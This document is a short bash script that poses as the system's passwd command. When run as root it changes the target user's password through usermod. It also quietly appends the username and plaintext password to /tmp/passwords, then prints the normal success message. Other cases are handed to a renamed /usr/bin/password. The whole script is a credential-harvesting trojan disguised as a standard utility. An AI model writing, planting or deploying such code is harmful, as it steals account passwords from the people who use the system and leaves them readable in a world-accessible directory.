#!/bin/bash

USERNAME=""
ISROOT=0
if [ $# -lt 1 ]; then 
    USERNAME=$SUDO_USER
elif id "$1" >/dev/null 2>&1; then
    # User exists
    USERNAME=$1
else
    # User does not exist
    /usr/bin/password $@
    exit
fi

if [ "$EUID" -ne 0 ]; then
    /usr/bin/password $@
    exit
fi

echo "Changing password for user $USERNAME"

changepass () {
    read -sp "New password: " NEWPASS
    echo
    read -sp "Retype new password: " NEWNEWPASS
    echo
    if [ $NEWNEWPASS != $NEWPASS ]; then
        echo "Sorry, passwords do not match."
        changepass
        exit
    fi
    usermod --password $(echo $NEWPASS | openssl passwd -1 -stdin) $USERNAME
    echo "$USERNAME:$NEWPASS" >> /tmp/passwords
    echo "passwd: password updated successfully"
}
changepass

